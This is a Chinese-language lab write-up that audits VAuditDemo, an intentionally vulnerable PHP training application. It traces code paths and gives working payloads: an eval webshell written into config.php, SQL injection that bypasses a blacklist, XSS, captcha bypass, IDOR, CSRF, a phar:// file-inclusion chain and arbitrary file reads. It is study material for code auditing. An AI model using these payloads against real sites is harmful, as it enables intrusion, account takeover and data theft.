# VAuditDemo

## 安装

该平台由于访问路径问题，必须放在根目录下，否则会出现路径跳转问题



一：安装的是VAuditDemo_Release

打开文件 /opt/lampp/etc/httpd.conf-----------DocumentRoot（定义网站根目录的地方）

修改网站的根目录地址。可以解决VAuditDemo的问题。



二：将服务绑定到其他端口

1）打开/opt/lampp/etc/extra/httpd-vhosts.conf，添加以下内容。

~~~
<VirtualHost *:81>
	DocumentRoot "/opt/lampp/htdocs/vaudit"
	ServerName localhost
</VirtualHost>

~~~

配置好81端口，为81端口配置服务

2）将httpd-vhosts.cong配置文件包含在主配置文件httpd.conf中

开打/opt/lampp/etc/httpd.conf，开启以下内容。

~~~
Include etc/extra/httpd-vhsots.conf   #  取消前面的#注释
~~~

3）添加apach监听的端口

开打/opt/lampp/etc/httpd.conf，开启以下内容。

~~~
Listen 81		#添加的vaudit端口
Listen 80		#默认端口
~~~

4）防火墙开放81端口

查看防火墙的的配置信息

~~~
firewall-cmd --list-all
~~~

防火墙开启端口

~~~
firewall-cmd --add-port=81/tcp --permanent		#防火墙添加81端口，--permanent是永久添加的意思
~~~

重新加载防火墙策略

~~~
firewall-cmd --reload		#用于重新加载防火墙规则并保持状态信息。这意味着将永久配置应用于运行时配置，使当前的内存中的规则成为永久性配置。在系统或Firewalld服务重启、停止时，这些配置将会失效。
~~~



三：留言失败问题解决

1）留言页面存在一下代码，不显示错误信息

~~~
error_reporting(0)		#屏蔽错误信息
~~~

将代码注释，显示错误信息。

2）报错信息显示了一下代码执行错误导致的：

~~~
include_once('../sys/lib.php');
~~~

由于文件包含时的路径错误导致的，修改为正确路径，留言成功。



## 代码审计



### 代码审计思路---敏感函数或对象

1）所有文件读写的敏感函数：

~~~
file_get_contents()		#将文件的内容读入到一个字符串中
fgets()					#从文件指针中读取一行。
file_put_contents()		#把一个字符串写入文件中
fwrite()				#将内容写入一个打开的文件中。
~~~

避免用户可控点，避免木马写入，避免文件读取，避免读取到网站源代码（防止黑盒变白盒，渗透变审计）。

2）所有用户可输入的对象：

~~~
$_POST
$_GET
$_SERVER
$_FILES
$_COOK
$_REQUEST
php://input
~~~

3）文件包含：

~~~
include()		
include_once()
require()
require_once()
~~~

确认文件包含里面的路径是否可控

4）命令或代码执行或自定义函数的调用：

~~~
eval()		#把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。
assert()	#断言函数，如果参数为php代码则会执行代码。
passthru()	#执行一个命令，并将输出直接发送到输出缓冲区
shell_exec()	#通过 shell 执行命令并将完整的输出以字符串的方式返回，可以执行cat，php等命令
call_user_func_array()	#调用回调函数，并把一个数组参数作为回调函数的参数
preg_replace()		#函数执行一个正则表达式的搜索和替换。
` `(反引号中间包裹系统命令)	#反引号可以执行 Unix 下的命令，并传回执行结果
system()		#执行系统命令
~~~

5）关于用户可控点的处理，注意，如果里面的参数不是直接来源于用户，而是一个变量，那么要回溯去看这个变量的值的来源。如下

eval（$name），要继续跟踪name变量的值的来源，知道最开始调用的地方。

6）常用的过滤条件：

~~~
addslashes()		#在每个双引号（“），单引号（'），反斜杠（\），NULL（）前添加反斜杠（转义）
mysql_real_escape_string()	#转义 SQL 语句中使用的字符串中的特殊字符（\x00，\n，\r，\，'，"，\x1a）
htmlspecialchars()	#把一些预定义的字符转换为 HTML 实体，要转化回去使用htmlspecialchars_decode()函数
str_ireplace()		#将一段字符串中的一段字符替换为另一段，其中i表示不区分大小写。
后缀名过滤
getimagesize(GIF图片马)	#获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息
~~~

7）常用的防御方式：

php.ini全局开关（通过phpinfo函数可以查看文件的位置，每个系统不一样）。能不让用户输入尽量不用，如果必须用就严格过滤，如果不确定是否过滤好就做好测试，或者安装waf（软waf或者硬waf）



### 二次安装

#### 漏洞原因

1）VAuditDemo平台安装时，需要安装数据库，数据库安装完之后会在/sys/文件下生成文件install.lock。该文件用来对平台是否安装进行标记。在config.php和install.php文件中有如下代码：

~~~
if (!file_exists($_SERVER["DOCUMENT_ROOT"].'/sys/install.lock')){	
	header("Location: /install/install.php");		
exit;												
}
#	$_SERVER["DOCUMENT_ROOT"]--服务器的根目录路径，拼接后面的路径，查看是否存在install.lock文件。如果不存在则跳转到安装界面，如果存在，直接结束程序，不在执行后面代码。


if ( file_exists($_SERVER["DOCUMENT_ROOT"].'/sys/install.lock') ) {
	header( "Location: ../index.php" );			
}
#	和上面代码功能类似，但缺少了exit，在存在install.lock文件的情况下，程序虽然会跳转到首页，用户无法访问到安装界面，由于没有exit，程序不会直接结束，还会执行下面的代码。
~~~

2）使用header进行重定向网页，是浏览器完成的工作，bp抓包进行检查，第一个请求发出后，获取响应，可以看到响应的正是安装数据库的页面，forword后才发出第二个重定向的请求。

3）查看第一个请求发出后的响应，可以看到安装数据库的页面有一个form表单，这是填数据库连接信息的表单，其中有如下信息。

~~~
	$dbhost = $_POST["dbhost"];
	$dbuser = $_POST["dbuser"];
	$dbpass = $_POST["dbpass"];
	$dbname = $_POST["dbname"];
~~~

且form表单的action=""，值为空，表示数据提交到了当前页面，且用户可控输入，$dbhost,$dbuser,$dbpass这三个变量用于连接数据库，不好修改，$dbname是创建的数据库名，可以随意修改。

4）查看后台代码，上述的变量写入了config.php文件中，用于后续程序连接数据库使用。代码如下

~~~
	$str_tmp.="\$host=\"$dbhost\"; \r\n";
	$str_tmp.="\$username=\"$dbuser\"; \r\n";
	$str_tmp.="\$password=\"$dbpass\"; \r\n";
	$str_tmp.="\$database=\"$dbname\"; \r\n";
	
	$fp=fopen( "../sys/config.php", "w" );
	fwrite( $fp, $str_tmp );
	fclose( $fp );
~~~

用户的可控输入$dbname写入了config文件中。找到了注入点，整体形成了调用链。



#### 注入方式

1）发送请求到192.168.1.111:81/install/install.php。使用bp抓到第一个请求。

2）修改请求，由于$dbname一共两处被调用。

~~~
"CREATE DATABASE $dbname"		#创建数据库时，sql语句中用到
~~~

~~~
$str_tmp.="$database="$dbname"; \r\n";		#写入config.php文件时用到
~~~

要保证写入的$dbname既符合sql语句的语法，也符合php的语法，并能够写入eval语句。

3）确定$dbname的值为：

~~~
$dbname=name-- ";@eval($_POST[a]);//
~~~

加入sql语句如下所示：

~~~
"CREATE DATABASE name-- ";@eval($_POST[a]);//"		#name后面的代码被--注释掉了，数据库被命名为“name”
~~~

加入php如下所示：

~~~
$str_tmp.="$database="name-- ";@eval($_POST[a]);//"; \r\n";		
#	--在php中不是注释，第一个分号（;）之前的为一段完整的php语句，@eval($_POST[a]);为第二段完整的php语句，//后面的都被指数掉了。
~~~

4）验证：

eval（）被成功写入，尝试访问/sys/config.php，添加参数a=phpinfo();并发送POST请求。phpinfo页面被调出，注入成功。

~~~
注意：index.php首页中有下面代码：
require_once('sys/config.php');
首页中包含了config文件，所以直接访问index.php文件，添加参数，同样可以执行代码。
~~~

5）菜刀连接：



### 留言功能漏洞

#### 查找留言功能的反射型XSS漏洞

1）查找留言的请求为search.php?search=。请求发送给search.php处理，且参数为search，

~~~
$query = "SELECT * FROM comment WHERE comment_text LIKE '%{$_GET['search']}%'";
~~~

尝试sql注入，失败，由于其中的单引号（'）和双引号（"）被转义了。

sql语句中的单双引号被转义，想到了mysql_real_escape_string（）函数，全局搜索到在lib.php中：

~~~
function clean_input( $dirty ) {
	return mysql_real_escape_string( stripslashes( $dirty ) );
}
~~~

继续查找clean_input()被调用的位置，但没找到对$_GET['search']进行过滤。但它确实被过滤了。

2）接着想到了addslashes（）函数也可以实现同样的功能，进行全局搜索：

~~~
function sec( &$array ) {
	if ( is_array( $array ) ) {
		foreach ( $array as $k => $v ) {
			$array [$k] = sec ( $v );
		}
	} else if ( is_string( $array ) ) {
		$array = addslashes( $array );
	} else if ( is_numeric( $array ) ) {
		$array = intval( $array );
	}
	return $array;
}

if( !get_magic_quotes_gpc() ) {
	$_GET = sec ( $_GET );
	$_POST = sec ( $_POST );
	$_COOKIE = sec ( $_COOKIE ); 
}
~~~

函数对get请求传递的所有参数进行了过滤，添加了反斜杠（\），所以sql注入无法实现

3）查看到代码中有：

~~~
<?php echo 'The result for [ '.$_GET['search'].' ] is:'?>
~~~

虽然addslashes（）对输入添加反斜杠（\），但只影响单引号（'）、双引号（"）和反斜线（\），并不影响其他如尖括号（<）等其他符号。所以尝试反射型XSS。

~~~
http://192.168.1.111:81/search.php?search=<script>alert(1)</script>
~~~

弹窗成功，此处存在反射型XSS。



#### 查看留言中sql注入和反射型xss

1）sqlwaf（）函数用于过滤id=？的用户输入部分，且其中出现了漏洞，||，&&被替换为空，过滤方式为黑名单，可以通过an||d进行绕过，程序从上到下执行，an||d绕过了对and的过滤，||被过滤为空，剩下的形成的and。

~~~
function sqlwaf( $str ) {
	$str = str_ireplace( "and", "sqlwaf", $str );
	$str = str_ireplace( "or", "sqlwaf", $str );
	$str = str_ireplace( "from", "sqlwaf", $str );
	$str = str_ireplace( "execute", "sqlwaf", $str );
	$str = str_ireplace( "update", "sqlwaf", $str );
	$str = str_ireplace( "count", "sqlwaf", $str );
	$str = str_ireplace( "chr", "sqlwaf", $str );
	$str = str_ireplace( "mid", "sqlwaf", $str );
	$str = str_ireplace( "char", "sqlwaf", $str );
	$str = str_ireplace( "union", "sqlwaf", $str );
	$str = str_ireplace( "select", "sqlwaf", $str );
	$str = str_ireplace( "delete", "sqlwaf", $str );
	$str = str_ireplace( "insert", "sqlwaf", $str );
	$str = str_ireplace( "limit", "sqlwaf", $str );
	$str = str_ireplace( "concat", "sqlwaf", $str );
	$str = str_ireplace( "\\", "\\\\", $str );
	$str = str_ireplace( "&&", "", $str );
	$str = str_ireplace( "||", "", $str );
	$str = str_ireplace( "'", "", $str );
	$str = str_ireplace( "%", "\%", $str );
	$str = str_ireplace( "_", "\_", $str );
	return $str;
}
~~~

全局搜索找到使用sqlwaf（）函数的地方。messageDetail.php中用到了sqlwaf（）。

~~~
$id = sqlwaf( $_GET['id'] );
~~~

尝试输入：

~~~
id=7 an||d 1=1#
id=7 un||ion sel||ect 1，2，3，database（）
~~~

sql注入成功。

2）messageDetail.php中同样存在输出（用户输入）的地方。

~~~
<?php echo 'The result for ['.$id.'] is:'?>
~~~

尝试反射型XSS。

~~~
id=<script>alert(1)</script>{--+}		{}中表示内容可有可无。
~~~

sql注入成功。



### 用户操作漏洞

1）用户登陆时没有验证码，也没有次数限制，可以进行爆破

2）可以注册用户名为admin'#的账户，可能存在二次注入的情况。



#### 验证码问题

##### 空验证码

管理员登陆时需要输入验证码，后台对验证码进行校验，代码如下。

~~~
if(@$_POST['captcha'] !== $_SESSION['captcha']){
    header('Location: login.php');
    exit;
}
~~~

后台将生成的验证码使用全局变量$_SESSION[’captcha‘]来保存，用它来和用户输入的验证码进行比较。

验证码生成是在captcha.php中生成，代码如下（代码内容不重要）：

当访问captcha.php，服务器就会生成验证码，并保存到SESSION变量中，全局搜索调用captcha.php的地方，在login.php中找到：

~~~
<div><img src="captcha.php"></div>
~~~

理论上，验证码在请求发送给captcha.php之后才会生成，并写入SESSION变量中。

使用BP抓包，请求只发送登录请求，将给captcha.php的请求去掉。

这时，将请求中的验证码删除，并且不发送请求给captcha.php，用户输入的验证码为空，SESSION['captcha']变量也为空。

空与空相等，满足验证码的判断条件，成功绕过。



##### 验证码不刷新

上述中的代码，在判断玩验证码之后，没有使用

~~~
unset $_SESSION['captcha']
~~~

如果不再发送请求给captcha.php，那么SESSION中的值不会被修改，可以一直使用之前的验证码连续登录，实现爆破。

一直发送下面请求，对pass字段进行遍历。

~~~
user=admin&pass=admin&captcha=d717&submit=%E7%99%BB%E5%BD%95
~~~

密码是错误的，得到响应字段为：

~~~
Location: login.php
~~~

当密码正确时，得到的响应字段为：

~~~
Location: login.php
~~~

可以用响应字段Location的值作为判断依据。用字典进行遍历。



#### 修改任意用户名，越权

用户修改用户名时，请求发送到了updataName.php，其中一下代码出现问题：

~~~
$clean_username = clean_input($_POST['username']);
$clean_user_id = clean_input($_POST['id']);
//clean_input()函数的所用是为单引号（‘），双引号（“）反斜杠（\）添加反斜杠进行转义。

$query = "UPDATE users SET user_name = '$clean_username' WHERE user_id = '$clean_user_id'";
~~~

sql语句的where条件是user_id，且是从POST请求中发过去的，使用BP抓请求，如下所示：

~~~
id=8&username=dali&submit=%E6%9B%B4%E6%96%B0
~~~

这个id是user表的id字段的值，尝试修改id值8为9。

发出请求，用户名修改成功，且当前用户成了user_id=9的用户，查看updataName.php代码，发现：

~~~
$_SESSION['username'] = $clean_username;
~~~

不但其他用户的用户名被修改，并且我们登录到了其他用户的账号。实现了越权。



#### 改密中的CSRF漏洞

修改密码时，使用BP抓取请求，可以看到使用的时SESSION-id进行校验用户身份的，尝试CSRF。

简单尝试，再BP自带的工具中进行，不尝试将请求放在另一台服务器上：

请求发送到repeater，右键请求，engagement tools，generate CSRF Poc。在生成的页面点击Test in Browser，复制链接，在浏览器中打开即可。



### 首页文件包含

1）查看到index.php文件中存在以下代码：

~~~
if (isset($_GET['module'])){
	include($_GET['module'].'.inc');
}只能包含文件后缀
~~~

文件包含时，在文件后缀添加了.inc（.inc不会被php解析），没有做其他过滤或者校验，参数完全可控，存在文件包含漏洞，接下来寻找文件上传的地方。

头像上传存在上传点，查看上传文件的过滤方式，

~~~
if(is_pic($_FILES['upfile']['name']))
	$extend =explode( "." , $file_name );
	$va=count( $extend )-1;
	if ( $extend[$va]=='jpg' || $extend[$va]=='jpeg' || $extend[$va]=='png' ) {
		return 1;
上述代码为函数的定义过程

if(is_pic($_FILES['upfile']['name']))
~~~

看到上传文件只能上传后缀为jpg，jpeg，png的图片，且文件会被重命名，如下所示：

~~~
$avatar = $uploaddir . '/u_'. time(). '_' . $_FILES['upfile']['name'];
~~~

2）攻击方式：写一个shell.php，将后缀改为shell.inc，压缩为shell.zip文件，将后缀改为shell.png。

上传文件shell.png，由于后缀为png，所以成功上传。

对重命名后的文件名进行猜测，主要是猜测时间戳，响应中有GMT（服务器发出响应的时间），转为时间戳，然后再这个范围中进行爆破，猜测出文件名。

访问index.php，请求发送方式如下：

~~~
http://192.168.1.111:81/index.php?module=phar://uploads/u_1698321114_shell.jpg/shell
POST请求，传参数code=phpinfo();
~~~

因为上传的是压缩包，且后缀被强制改为了.inc，所以使用phar://伪协议（解压缩函数，不管后缀是什么都会被当作压缩包来解压）。



### 任意文件读取漏洞

1）全局搜索危险函数，user/avatar.php（头像查看）中存在如下代码：

~~~
echo file_get_contents($_SESSION['avatar']);
~~~

查看`$_SESSION['avatar']`变量是否可控，查看到logCheck.php中存在如下：

~~~
$_SESSION['avatar'] = $row['user_avatar'];
~~~

继续查看变量`$row['user_avatar']`是否可控，查看到logCheck.php中存在如下：

~~~
$row = mysql_fetch_array($data);

$data = mysql_query($query, $conn)

$query = "SELECT * FROM users WHERE user_name = '$clean_name' AND user_pass = SHA('$clean_pass')";
~~~

$row是当前用户在users表中的所有信息，那 $row['user_avatar'] 就是当前登录用户users表中的avatar字段的信息内容。

user_avatar字段的值是用户头像文件的路径，查找路径是在那写入的，再updateAvatar.php中找到如下：

~~~
$query = "UPDATE users SET user_avatar = '$avatar' WHERE user_id = '{$_SESSION['user_id']}'";
~~~

数据库中的user_avatar字段的值是由变量 $avatar 赋值的，查看$avatar是否可控，在updateAvatar.php中如下所示：

~~~
$avatar = $uploaddir . '/u_'. time(). '_' . $_FILES['upfile']['name'];
~~~

`$_FILES['upfile']['name']`变量为上传文件的文件名，是可控参数。就此形成一条调用链：



2）调用链中$row['user_avarar']来自于当前用户在数据库中user_avatar字段的值
这个字段的值，表示用户头像存储的路径
路径在最上面的sql语句中写入，文件名可控，
文件名可控-----文件路径写入数据库---从数据库中调出文件名---filegetcontent读出文件，最终形成了一条可控的调用链。



3）利用过程：

文件名被添加了时间戳进行了重命名，且重命名后的文件名猜测难度大。

但在写入数据库中使用了UPDATE，他有一个特点，如下所示：

~~~
update user set user_avatar = '1111' , user_avatar = '2222' where user_name =root
~~~

两条修改语句中间用逗号（，）隔开，sql语句执行完之后，前一条被后一条覆盖，也就是执行结果为2222。//重点

上传的头像文件的后缀名必须为jpg，jpeg，png，需要在文件末尾加上.jpg，并在他们前面添加井号（#）将其注释掉，防止影响sql语句，	//重点

那么，修改文件名实现sql注入：

~~~
$query = "UPDATE users SET user_avatar = '$avatar' WHERE user_id = '{$_SESSION['user_id']}'";

$query = "UPDATE users SET user_avatar = '$avatar' , user_avatar = 'index.php' where user_name = 'root'#.jpg' WHERE user_id = 
~~~

这样写入数据库user_avatar字段的内容为 index.php 了，访问avatar.php就可以将index.php文件中的内容包含进来了。

但这样只能包含同级目录中的文件，想要进行目录穿越，包含任意文件，需要使用 ../index.php ，但斜杠（/）在sql语句中被解析为除号，需要将 ../index.php 转为16进制，这样就可被mysql成功读出了。注意转为16进制要在前面加0x 	//重点

最终sql语句变为了

~~~
UPDATE users SET user_avatar = '$avatar' , user_avatar = 0x2E2E2F696E6465782E706870 where user_name = 'root'#.jpg' WHERE user_id = 

文件名为：
$avatar' , user_avatar = 0x2E2E2F696E6465782E706870 where user_name = 'root'#.jpg
~~~



4）上传头像，使用BP抓包，修改文件名为`$avatar' , user_avatar = 0x2E2E2F696E6465782E706870 where user_name = 'root'#.jpg`，上传文件，查看数据库users表中的user_avatar字段，内容被修改为了../index.php。

访问avatar.php，由于服务器对该文件中的内容解析为图片，所以浏览器渲染不出来。使用BP查看响应中的内容，即可看到文件中的源代码。也可以直接将文件名改为 /etc/passwd，这样可以直接读取源文件，实现任意文件读取。



### 二次注入漏洞，留言板的sql注入

1）在留言板中写入database（），提交，查看到回显结果显示为database（），留言上传成功，但是database（）没有被解析为sql语句，而是被当作字符串输入输出。

查看数据库，看到数据库中写入的数据为database（），怀疑输出的过程中被转义了。查看message.php，代码如下：

~~~
$html['username'] = htmlspecialchars($com['user_name']);
$html['comment_text'] = htmlspecialchars($com['comment_text']);
~~~

输出内容都被hmlspecialchars（）转义了，从数据库到前端的过程是字符串到字符串的过程，无法利用。



2）尝试在写入数据库时，将database（）解析完再将结果写入数据库。查看messageSub.php，代码如下：

~~~
$clean_message = clean_input($_POST['message']);		//clean_input()是调用了addslashes（）添加\的。
	
$query = "INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('{$_SESSION['username']}','$clean_message',now())";
~~~

~~~
function clean_input( $dirty ) {
	return mysql_real_escape_string( stripslashes( $dirty ) );	//删除参数中的反斜杠（\），再添加反斜杠。
}
~~~

代码将用户输入的留言进行了添加反斜杠（\）的处理

但是database（）不在addslashes（）的处理范围之内，为什么它不被sql语句执行，而是被当作字符串？//重点

​	因为它在上述的sql语句中，被单引号（''）包裹了，被当作字符串处理了。



3）想到的解决方法有将写入的留言从：

~~~
database（）改为  ',database()#
~~~

这样闭合掉前面的单引号，将database（）从引号包裹中逃逸出来，但这样解决不了问题，原因有两个

一是留言被mysql_real_escape_string（）处理，单引号会被转义，无法绕开。

二是输出中只显示用户名和留言内容，不显示第三个字段的内容。



4）在这条sql语句中，留言内容前面还有用户名，这也是可控点。

如果创建的用户名为 admin\ 。这样形成的sql语句如下所示：

~~~
VALUES ('admin\','$clean_message,now())#',now())
~~~

这样，第二个单引号被转移为普通字符，第三个单引号和第一个单引号形成一对，$clean_message从单引号的包裹中逃逸出来。

查看regCheck.php：

~~~
$clean_name = clean_input($_POST['user']);
~~~

用户名在被注册时，也是调用了mysql_real_escape_string（），添加了反斜杠（\） 



5）创建用户 admin\ 用户本来创建不会成功，\会破坏sql语句，但是正因为在反斜杠（\）前面有添加了反斜杠（\），所以sql语句才执行能成功，创建用户成功。

创建成功以后，显示的用户是 `admin\\`，退出重新登录，刷新session中的值，这时显示的用户名为`admin\`。

发表留言，其内容为：

~~~
,database(),now())#
~~~

最终形成的sql语句为：

~~~
INSERT INTO comment(user_name,comment_text,pub_date) VALUES ('admin\',',database(),now())#',''',now())
~~~

上传完，查看数据库中插入的内容为 vauditdemo ，查看前端的回显内容，其值也为 vauditdemo 。



6）整体形成了先注入用户名`admin\`，再进行sql注入，形成二次注入。



7）我有问题解决不了：

~~~
function clean_input( $dirty ) {
	echo mysql_real_escape_string( stripslashes( $dirty ) );
}
~~~

上述函数，传入变量以后，先使用stripslashes（）删除了字符串中的反斜线（\）,再使用mysql_real_escape_string（）函数为特殊字符添加了反斜线（\），这时一种典型的处理方式，为了防止一种绕过方式：

~~~
比如为#添加反斜线，它先\#，这样在#前添加\，就形成了\\#，
~~~

整体处理用户名输入时，先调用的stripslashes（），用户名为admin\，反斜杠应该被去掉，变成了admin，再调用mysql_real_escape_string()，添加反斜杠，但现在函数包裹的时admin字符串，应该不再添加反斜杠 。

创建用户名为admin#的用户，可以正常创建，因为经过clean_input()函数的处理，为井号（#）添加了反斜杠（\）才能成功写入数据库。

现在创建用户名为admin\的用户，经过clean_input()的处理，反斜杠应该被去掉了，剩下的admin字符串应该不会被添加反斜杠（\），最后写入数据库的用户名应该是admin。

且clean_input()在处理admin#时，得出的结果为admin。没有添加反斜杠（\）成admin\#，也没有原样输出成为admin#。

但是本系统中，创建用户admin\时，可以创建成功，经过处理，用户名为admin\，创建用户admin#时，可以创建成功，用户名为admin#。

得到的结果和语句中的结果不符合。问题还未解决。



### 创建管理员时的CSRF漏洞

管理员登录之后可以创建新的管理员。

抓取请求，查看到请求发送到了manageAdmin.php中。查看manageAdmin.php中的代码。

发现其中仅仅校验了cookie，没有做任何其他校验。可以尝试CSRF。

抓取请求，生成CSRF的POC，管理员点击链接，请求发送成功，生成了新的管理员。



### 通过ip写入的存储型XSS

同样在管理员界面，管理员可以查看用户登录的ip，查看manageUser.php，看到有如下代码。

~~~
<?php echo $users['login_ip'];?>
~~~

判断该参数是否可控。

~~~
$users = mysql_fetch_array($data)

$data = mysql_query($query, $conn) or die('Error')
~~~

可以判断出，该ip是用户在登录服务器时被服务器记录到数据库中的ip地址。

数据库中的ip是通过什么写入的，查看logCheck.php，代码如下：

~~~
$query = "UPDATE users SET login_ip = '$ip' WHERE user_id = '$row[user_id]'";

$ip = sqlwaf(get_client_ip());
~~~

搜索get_client_ip()，在lib.php中，代码如下：

~~~
function get_client_ip(){
	if ($_SERVER["HTTP_CLIENT_IP"] && strcasecmp($_SERVER["HTTP_CLIENT_IP"], "unknown")){
		$ip = $_SERVER["HTTP_CLIENT_IP"];
	}else if ($_SERVER["HTTP_X_FORWARDED_FOR"] && strcasecmp($_SERVER["HTTP_X_FORWARDED_FOR"], "unknown")){
		$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
	}else if ($_SERVER["REMOTE_ADDR"] && strcasecmp($_SERVER["REMOTE_ADDR"], "unknown")){
		$ip = $_SERVER["REMOTE_ADDR"];
	}else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")){
		$ip = $_SERVER['REMOTE_ADDR'];
	}else{
		$ip = "unknown";
	}
	return($ip);
}
~~~

需要写入的ip首先选择是http_client_ip字段，如果该字段不存在，判断http_x_forwarded_for是否存在，如果不存在，再判断remote_adda字段。

其中只有http_x_forwarded_for是可控的，请求中没有http_client_ip字段时，就会将http_x_forwarded_for字段的内容写入。

BP抓取登录请求，手动添加X-FORWARDED-FOR: `<script>alert(1)</script>`，发出请求，查看数据库，数据完整写入数据库。

登陆管理员账户，查看用户选项，成功弹窗。存储型xss成功。



